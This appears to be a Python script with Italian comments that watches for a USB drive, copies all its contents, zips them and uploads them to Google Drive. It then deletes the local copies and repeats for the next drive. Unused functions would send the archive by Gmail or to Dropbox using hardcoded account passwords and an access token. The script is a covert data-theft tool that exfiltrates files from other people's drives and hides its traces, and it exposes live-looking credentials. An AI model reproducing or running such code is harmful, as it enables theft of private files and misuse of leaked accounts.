versione = 1
import dropbox
import os
import shutil
import time
from zipfile import *
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
dirchiave = "sconosciuta"

def actualversion(versione):
    actvers = open("actualversion.txt", "w")
    actvers.write(str(versione))
    actvers.close()

actualversion(versione)

def copia():
    global dirchiave
    global a
    def ciclodirectory():
        global dirchiave
        global dir
        dir = "C:\\TemP\\nope\\usb\\"
        while True:
            if os.path.exists("D:\\") == True:
                dirchiave = "D:\\"
                break
            elif os.path.exists("E:\\") == True:
                dirchiave = "E:\\"
                break
            elif os.path.exists("F:\\") == True:
                dirchiave = "F:\\"
                break
    ciclodirectory()
    print(dirchiave)
    a = time.strftime("%H-%M")
    shutil.copytree(dirchiave,dir + str(a))


def tozip():
    global a
    with ZipFile(str(a)+".zip", 'w') as zipObj:
       # Iterate over all the files in directory
       for folderName, subfolders, filenames in os.walk(dir + str(a)):
           for filename in filenames:
               #create complete filepath of file in directory
               filePath = os.path.join(folderName, filename)
               # Add file to zip
               zipObj.write(filePath)

def invioemail():

    #credenziali
    mitt = "perugini.torelli@gmail.com"
    passw = "Giocare2002"
    ricev = "andreaperugini74@gmail.com"
    subject = "Python"

    msg = MIMEMultipart()
    msg["From"] = mitt
    msg["To"] = ricev
    msg["Subject"] = subject
    
    body = "testo email"    #testo dell'email
    msg.attach(MIMEText(body,"plain"))

    filename = "estratto.zip"       #file da caricare
    attachment =open(filename,"rb")

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition","attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP("smtp.gmail.com",587) #tipo di server da utilizzare
    server.starttls()
    server.login(mitt,passw)  #login

    server.sendmail(mitt,ricev,text)
    server.quit()

def inviodropbox():
    global a
    access_token = "5NXX2gJsovAAAAAAAAAAR1JVXFRJZMaSeX6MLPsuqmiBGiQv07lFE8MLbEmAGLEO"
    file_from = os.getcwd() + "\\" + str(a)  
    file_to = "/Chiavette/" + str(a)      
    def upload_file(file_from, file_to):
        dbx = dropbox.Dropbox(access_token)
        f = open(file_from, 'rb')
        dbx.files_upload(f.read(), file_to)
    upload_file(file_from,file_to)
def eliminazione():
    cwd = os.getcwd()
    os.remove(cwd + "\\" + str(a)+".zip")
    
    for root, dirs, files in os.walk("C:\\TemP\\nope\\usb"):
        for f in files:
            os.unlink(os.path.join(root, f))
        for d in dirs:
            shutil.rmtree(os.path.join(root, d))

def inviodrive():
    gauth = GoogleAuth()
    # Try to load saved client credentials
    gauth.LoadCredentialsFile("mycreds.txt")
    if gauth.credentials is None:
        # Authenticate if they're not there
        gauth.LocalWebserverAuth()
    elif gauth.access_token_expired:
        # Refresh them if expired
        gauth.Refresh()
    else:
        # Initialize the saved creds
        gauth.Authorize()
    # Save the current credentials to a file
    gauth.SaveCredentialsFile("mycreds.txt")

    drive = GoogleDrive(gauth)

    textfile = drive.CreateFile()
    textfile.SetContentFile(str(a)+'.zip')
    textfile.Upload()

def controllo():
    global dirchiave
    while True:
        esistenza = os.path.exists(dirchiave)
        if esistenza == True:
            time.sleep(10)
            continue
        else:
            break

while True:
    copia()
    print("copiato")
    tozip()
    print("zippato")
    inviodrive()
    print("inviato")
    eliminazione()
    print("eliminato")
    controllo()
